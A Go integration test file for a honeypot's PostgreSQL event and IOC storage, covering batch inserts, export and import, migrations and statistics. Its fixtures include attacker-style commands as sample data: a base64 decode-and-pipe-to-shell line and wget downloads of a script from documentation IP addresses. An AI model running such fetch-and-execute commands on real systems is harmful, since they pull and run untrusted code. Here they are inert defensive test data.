package database

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/config"
)

// connectPG connects to a PostgreSQL server described by QPOT_TEST_PG_* env
// vars, skipping unless QPOT_TEST_POSTGRES=1. Plain PostgreSQL is enough: the
// events table is created without the TimescaleDB hypertable, and the iocs
// table through the production createIOCTable.
func connectPG(t *testing.T) *TimescaleDB {
	t.Helper()
	if os.Getenv("QPOT_TEST_POSTGRES") != "1" {
		t.Skip("set QPOT_TEST_POSTGRES=1 to run PostgreSQL integration tests")
	}
	port := 5432
	if p := os.Getenv("QPOT_TEST_PG_PORT"); p != "" {
		port, _ = strconv.Atoi(p)
	}
	ts, err := NewTimescaleDB(&config.DatabaseConfig{
		Host:     envOr("QPOT_TEST_PG_HOST", "127.0.0.1"),
		Port:     port,
		Username: envOr("QPOT_TEST_PG_USER", "postgres"),
		Password: envOr("QPOT_TEST_PG_PASS", "postgres"),
		Database: envOr("QPOT_TEST_PG_DB", "qpot_test"),
		SSLMode:  "disable",
	})
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	if err := ts.Connect(ctx); err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(func() { ts.Close() })
	for _, q := range []string{
		`DROP TABLE IF EXISTS events, iocs CASCADE`,
		`CREATE TABLE events (
			id BIGSERIAL, timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(), honeypot TEXT NOT NULL,
			source_ip INET, source_port INTEGER, dest_port INTEGER, protocol TEXT, event_type TEXT,
			username TEXT, password TEXT, command TEXT, payload BYTEA, metadata JSONB,
			country TEXT, city TEXT, asn TEXT,
			technique_id TEXT DEFAULT '', technique_name TEXT DEFAULT '', tactic_id TEXT DEFAULT '',
			tactic_name TEXT DEFAULT '', kill_chain_stage TEXT DEFAULT '',
			confidence DOUBLE PRECISION DEFAULT 0, classified BOOLEAN DEFAULT FALSE)`,
		// The pre-fix iocs schema, so createIOCTable's in-place upgrade is exercised.
		`CREATE TABLE iocs (id TEXT NOT NULL, type TEXT NOT NULL, value TEXT NOT NULL,
			honeypot TEXT NOT NULL, source_ip TEXT, technique_id TEXT DEFAULT '',
			first_seen TIMESTAMPTZ NOT NULL DEFAULT NOW(), last_seen TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			count BIGINT DEFAULT 1, metadata JSONB, UNIQUE (type, value, honeypot))`,
	} {
		if _, err := ts.pool.Exec(ctx, q); err != nil {
			t.Fatalf("setup: %v", err)
		}
	}
	if err := ts.createIOCTable(ctx); err != nil {
		t.Fatalf("createIOCTable: %v", err)
	}
	return ts
}

// INET columns must come back as plain addresses ("1.2.3.4", not
// "1.2.3.4/32"), and filtering by a plain address must match.
func TestPGSourceIPIsPlainAddress(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	ev := &Event{Timestamp: time.Now().UTC(), Honeypot: "cowrie", SourceIP: "203.0.113.5", EventType: "login_failed"}
	if err := ts.InsertEvent(ctx, ev); err != nil {
		t.Fatal(err)
	}
	got, err := ts.GetEvents(ctx, EventFilter{SourceIPs: []string{"203.0.113.5"}, Limit: 10})
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].SourceIP != "203.0.113.5" {
		t.Fatalf("GetEvents by IP = %d rows (%v), want 1 row with plain IP", len(got), got)
	}
	un, err := ts.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(un) != 1 || un[0].SourceIP != "203.0.113.5" {
		t.Fatalf("GetUnclassifiedEvents = %v, %v", un, err)
	}
	top, err := ts.GetTopAttackers(ctx, 10, time.Now().Add(-time.Hour))
	if err != nil || len(top) != 1 || top[0].SourceIP != "203.0.113.5" {
		t.Fatalf("GetTopAttackers = %v, %v", top, err)
	}
}

// A long attacker-controlled IOC value must not fail (and roll back) the batch.
func TestPGLongIOCValue(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	raw := make([]byte, 6000)
	if _, err := rand.Read(raw); err != nil {
		t.Fatal(err)
	}
	long := "echo " + base64.StdEncoding.EncodeToString(raw) + " | base64 -d | sh"
	now := time.Now().UTC()
	iocs := []*IOC{
		{ID: "a", Type: "command", Value: long, Honeypot: "cowrie", FirstSeen: now, LastSeen: now, Count: 1},
		{ID: "b", Type: "ip", Value: "198.51.100.1", Honeypot: "cowrie", FirstSeen: now, LastSeen: now, Count: 1},
	}
	if err := ts.InsertIOCs(ctx, iocs); err != nil {
		t.Fatalf("InsertIOCs: %v", err)
	}
	// Re-inserting the same long value must upsert, not duplicate.
	if err := ts.InsertIOCs(ctx, iocs[:1]); err != nil {
		t.Fatalf("InsertIOCs again: %v", err)
	}
	var rows, count int64
	if err := ts.pool.QueryRow(ctx, `SELECT count(*), COALESCE(SUM(count) FILTER (WHERE type='command'),0) FROM iocs`).Scan(&rows, &count); err != nil {
		t.Fatal(err)
	}
	if rows != 2 || count != 2 {
		t.Fatalf("rows=%d command count=%d, want 2 rows and count 2", rows, count)
	}
}

// Re-sighting an IOC without a technique must keep the stored technique.
func TestPGIOCKeepsTechnique(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC()
	ioc := &IOC{ID: "u", Type: "url", Value: "http://198.51.100.2/x.sh", Honeypot: "cowrie",
		TechniqueID: "T1105", FirstSeen: now, LastSeen: now, Count: 1}
	if err := ts.InsertIOC(ctx, ioc); err != nil {
		t.Fatal(err)
	}
	again := *ioc
	again.TechniqueID = ""
	if err := ts.InsertIOCs(ctx, []*IOC{&again}); err != nil {
		t.Fatal(err)
	}
	var tech string
	if err := ts.pool.QueryRow(ctx, `SELECT technique_id FROM iocs WHERE value=$1`, ioc.Value).Scan(&tech); err != nil {
		t.Fatal(err)
	}
	if tech != "T1105" {
		t.Fatalf("technique_id = %q after re-sighting, want T1105", tech)
	}
}

// Export then import must restore every row, including commands with newlines.
func TestPGExportImportMultilineCommand(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC().Truncate(time.Second)
	for i, cmd := range []string{"echo a\nwget http://198.51.100.3/x.sh", "uname -a"} {
		ev := &Event{Timestamp: now.Add(time.Duration(i) * time.Second), Honeypot: "cowrie",
			SourceIP: "203.0.113.6", EventType: "command", Command: cmd}
		if err := ts.InsertEvent(ctx, ev); err != nil {
			t.Fatal(err)
		}
	}
	var buf bytes.Buffer
	if err := ts.ExportData(ctx, now.Add(-time.Minute), now.Add(time.Minute), &buf); err != nil {
		t.Fatal(err)
	}
	if _, err := ts.pool.Exec(ctx, `TRUNCATE events`); err != nil {
		t.Fatal(err)
	}
	if err := ts.ImportData(ctx, &buf); err != nil {
		t.Fatal(err)
	}
	var n int
	var cmd string
	if err := ts.pool.QueryRow(ctx, `SELECT count(*), COALESCE(MAX(command) FILTER (WHERE command LIKE 'echo%'),'') FROM events`).Scan(&n, &cmd); err != nil {
		t.Fatal(err)
	}
	if n != 2 || cmd != "echo a\nwget http://198.51.100.3/x.sh" {
		t.Fatalf("imported %d rows, multiline command %q; want 2 rows and the original command", n, cmd)
	}
}

// Migrate must work on a fresh database (no schema_migrations table yet), and
// rolling back must actually lower the reported version.
func TestPGMigrateUpAndDown(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	if _, err := ts.pool.Exec(ctx, `DROP TABLE IF EXISTS schema_migrations`); err != nil {
		t.Fatal(err)
	}
	mm := NewMigrationManager(ts)
	for _, mig := range GetCoreMigrations() {
		mm.Register(mig)
	}
	if err := mm.Migrate(ctx); err != nil {
		t.Fatalf("Migrate: %v", err)
	}
	for _, step := range []int{2, 0, 3} {
		if err := mm.MigrateToVersion(ctx, step); err != nil {
			t.Fatalf("MigrateToVersion(%d): %v", step, err)
		}
		if v, _ := mm.GetCurrentVersion(ctx); v != step {
			t.Fatalf("after MigrateToVersion(%d) version = %d", step, v)
		}
	}
}

// One malformed attacker-supplied event must not roll back the whole batch.
func TestPGInsertEventsSurvivesBadValues(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC()
	events := []*Event{
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.5", EventType: "login_failed"},
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "", EventType: "session"},
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.6", Username: "root\x00", EventType: "login_failed"},
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.7", Command: "echo \xff\xfe",
			Metadata: map[string]string{"k\x00": "v\xff"}, EventType: "command"},
	}
	if err := ts.InsertEvents(ctx, events); err != nil {
		t.Fatalf("InsertEvents: %v", err)
	}
	var n int
	if err := ts.pool.QueryRow(ctx, `SELECT count(*) FROM events`).Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != len(events) {
		t.Fatalf("persisted %d of %d events", n, len(events))
	}
}

func TestPGIOCFilters(t *testing.T) {
	checkIOCValueAndSourceFilters(t, connectPG(t), nil)
}

// TestPGCollectorIngestView replays the statement Vector's postgres sink
// issues (jsonb_populate_recordset over the target's row type) against the
// events_ingest view with collector-shaped rows: fields the view lacks must
// take the table defaults (id, classified=false), unknown keys are ignored,
// and a hex-encoded payload with a backslash round-trips.
func TestPGCollectorIngestView(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	if _, err := ts.pool.Exec(ctx, eventsIngestViewSQL); err != nil {
		t.Fatal(err)
	}
	rows := `[{"timestamp":"2026-11-02 05:28:03.341+00","honeypot":"cowrie","source_ip":"203.0.113.9",
		"source_port":55632,"dest_port":22,"protocol":"ssh","event_type":"cowrie.command.input",
		"username":"","password":"","command":"uname -a","payload":"\\x615c7a62",
		"metadata":{"session":"s1"},"qpot_id":"qp_x","message":"raw","file":"/data/x"}]`
	if _, err := ts.pool.Exec(ctx,
		`INSERT INTO events_ingest SELECT * FROM jsonb_populate_recordset(NULL::events_ingest, $1)`, rows); err != nil {
		t.Fatalf("sink-style insert: %v", err)
	}
	got, err := ts.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(got) != 1 {
		t.Fatalf("GetUnclassifiedEvents = %v, %v", got, err)
	}
	ev := got[0]
	if ev.Command != "uname -a" || string(ev.Payload) != `a\zb` ||
		ev.Metadata["session"] != "s1" || ev.Classified {
		t.Fatalf("ingested event = %+v", ev)
	}
	// No GeoIP: country/city/asn are NULL. Every read path must cope.
	if top, err := ts.GetTopAttackers(ctx, 10, time.Time{}); err != nil || len(top) != 1 || top[0].SourceIP != "203.0.113.9" {
		t.Fatalf("GetTopAttackers = %v, %v", top, err)
	}
	if evs, err := ts.GetEvents(ctx, EventFilter{Limit: 10}); err != nil || len(evs) != 1 {
		t.Fatalf("GetEvents = %v, %v", evs, err)
	}
	var buf bytes.Buffer
	if err := ts.ExportData(ctx, time.Time{}, time.Now().Add(time.Hour), &buf); err != nil {
		t.Fatalf("ExportData: %v", err)
	}
	if _, err := ts.GetStats(ctx, time.Time{}); err != nil {
		t.Fatalf("GetStats: %v", err)
	}
}

func TestPGTagsSameTimestampEventsSeparately(t *testing.T) {
	ts := connectPG(t)
	checkSameMillisecondTagging(t, ts, "198.51.100.77", func() {})
}

// GetStats must report per-honeypot counts: alert honeypot filters, the alert's
// top honeypot and the overview all depend on them.
func TestPGStatsTopHoneypots(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC()
	var evs []*Event
	for i := 0; i < 3; i++ {
		evs = append(evs, &Event{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.5", EventType: "x"})
	}
	evs = append(evs, &Event{Timestamp: now, Honeypot: "dionaea", SourceIP: "203.0.113.6", EventType: "x"})
	if err := ts.InsertEvents(ctx, evs); err != nil {
		t.Fatal(err)
	}
	st, err := ts.GetStats(ctx, now.Add(-time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	if len(st.TopHoneypots) != 2 || st.TopHoneypots[0].Honeypot != "cowrie" || st.TopHoneypots[0].Count != 3 ||
		st.TopHoneypots[1].Count != 1 {
		t.Fatalf("TopHoneypots = %+v", st.TopHoneypots)
	}
}

func TestPGIOCSightingsAccumulate(t *testing.T) {
	checkIOCSightingsAccumulate(t, connectPG(t), "198.51.100.90", func() {})
}

// An export must import back in full: events without a source IP (exported as
// "") used to fail the ::inet cast and be dropped with only a log line, and
// timestamps lost their sub-second part.
func TestPGExportImportKeepsNullIPAndPrecision(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	at := time.Now().UTC().Truncate(time.Millisecond).Add(-time.Minute).Add(123 * time.Millisecond)
	if _, err := ts.pool.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type, username, password, command,
		protocol, country, city, asn) VALUES ($1, 'cowrie', NULL, 'x', '', '', '', '', '', '', '')`, at); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := ts.ExportData(ctx, at.Add(-time.Minute), at.Add(time.Minute), &buf); err != nil {
		t.Fatal(err)
	}
	if _, err := ts.pool.Exec(ctx, `DELETE FROM events`); err != nil {
		t.Fatal(err)
	}
	if err := ts.ImportData(ctx, &buf); err != nil {
		t.Fatalf("ImportData: %v", err)
	}
	var n int
	var got time.Time
	if err := ts.pool.QueryRow(ctx, `SELECT COUNT(*), MAX(timestamp) FROM events WHERE source_ip IS NULL`).Scan(&n, &got); err != nil {
		t.Fatal(err)
	}
	if n != 1 || !got.Equal(at) {
		t.Fatalf("imported %d NULL-IP rows at %v, want 1 at %v", n, got, at)
	}

	if err := ts.ImportData(ctx, strings.NewReader("header\nnot,a,valid,row\n")); err == nil {
		t.Error("ImportData reported success for a malformed row")
	}
}
